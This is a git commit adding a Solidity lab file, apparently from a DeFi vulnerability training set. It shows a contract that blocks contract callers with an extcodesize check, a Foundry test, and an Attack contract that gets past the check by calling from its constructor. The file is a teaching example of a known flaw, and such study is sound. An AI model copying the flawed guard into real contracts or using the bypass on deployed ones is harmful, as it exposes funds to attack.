86b30d94dd22c8bf4ed5c503483d80e660623f63
MiriTenenboim <miryamt@darkeychana.com>
2024-06-16 11:27:35 +0300

    bypass contract - deFiVulnLabs

--- src/deFiVulnLabs/bypassContract.sol
+++ src/deFiVulnLabs/bypassContract.sol
@@ -2,6 +2,48 @@
 pragma solidity ^0.8.24;
 
 import "forge-std/Test.sol";
-import "forge-std/console.sol";
 
-contract 
+contract Target {
+
+    function isContract(address account) public view returns (bool) {
+        uint size;
+
+        assembly {
+            size := extcodesize(account)
+        }
+
+        return size > 0;
+    }
+
+    bool public pwned = false;
+
+    function protected() external {
+        require(!isContract(msg.sender), "no contract allowed");
+        pwned = true;
+    }
+}
+
+contract TestTargetFailedAttack is Test {
+    Target public target;
+
+    function setUp() public {
+        target = new Target();
+    }
+
+    function testPwn() public {
+        vm.expectRevert("no contract allowed");
+
+        target.protected();
+    }
+}
+
+contract Attack {
+    bool public isContract;
+    address public addr;
+
+    constructor(address target) {
+        isContract = Target(target).isContract(address(this));
+        addr = address(this);
+        Target(target).protected();
+    }
+}
